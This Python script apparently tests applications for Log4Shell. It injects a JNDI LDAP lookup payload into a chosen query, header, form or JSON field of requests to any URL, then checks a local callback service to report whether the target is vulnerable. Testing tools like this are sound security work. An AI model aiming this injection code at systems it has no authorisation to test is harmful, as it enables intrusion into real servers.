from msilib.schema import Error
from typing import Any, Dict, Literal
from dataclasses import dataclass
import requests
import json


@dataclass
class ExploitConfig:
    ldap_query: str
    target_payload: str
    target_key: str

@dataclass
class Request:
    url: str
    headers: Dict[str, Any]
    querys: Dict[str, Any]
    datas: Dict[str, Any]
    method: Literal["get", "post", "put", "patch", "delete"]
    payload_method: Literal["json", "form"]


def exploit(request: Request, config: ExploitConfig):
    jndi = "${jndi:" + config.ldap_query + "}"

    querys = request.querys.copy()
    headers = request.headers.copy()
    datas = request.datas.copy()

    match config.target_payload:
        case "query":
            querys[config.target_key] = jndi
        case "header":
            headers[config.target_key] = jndi
        case "form":
            datas[config.target_key] = jndi
        case "json":
            datas[config.target_key] = jndi

    print("Request with query: ", querys)
    print("Request with headers: ", headers)
    print("Request with datas: ", datas)

    match request.method:
        case "get":
            requests.get(request.url, params=querys, headers=headers)
        case "post":
            match request.payload_method:
                case "json":
                    requests.post(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.post(request.url, params=querys, headers=headers, data=datas)
        case "put":
            match request.payload_method:
                case "json":
                    requests.put(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.put(request.url, params=querys, headers=headers, data=datas)
        case "patch":
            match request.payload_method:
                case "json":
                    requests.patch(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.patch(request.url, params=querys, headers=headers, data=datas)
        case "delete":
            requests.delete(request.url, params=querys, headers=headers)

def check_exploit() -> bool:
    res = requests.get("http://localhost:5000/status")
    data = res.json()
    return data["status"]

def reset_exploit() -> bool:
    res = requests.post("http://localhost:5000/reset")
    data = res.json()
    if "message" not in data or data["message"] != "Success":
        return False
    return True

def run_exploit(request: Request, target_payload: str, target_key: str):
    if not reset_exploit():
        raise Error("Error reset SafeApp server state")
    config = ExploitConfig("ldap://localhost:1389/uid=exploit,ou=people,dc=example,dc=com", target_payload, target_key)
    exploit(request=request, config=config)
    if check_exploit():
        print("Your application with targeted request is vulnerable to Log4Shell!")
    else:
        print("Your application is safe from Log4Shell on targeted request!")
